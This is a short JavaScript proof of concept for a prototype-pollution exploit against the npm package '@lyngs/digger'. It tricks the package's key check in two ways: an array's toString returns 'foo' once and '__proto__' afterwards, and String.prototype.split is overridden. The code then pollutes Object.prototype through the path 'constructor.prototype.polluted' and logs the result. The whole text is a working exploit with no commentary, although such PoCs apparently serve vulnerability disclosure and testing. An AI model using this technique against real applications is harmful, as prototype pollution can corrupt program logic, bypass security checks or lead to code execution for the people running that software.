var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const {digger} = require('@lyngs/digger');
console.log({}.polluted);
digger({}, 'constructor.prototype.polluted', 'yes', { extend: true });
console.log({}.polluted);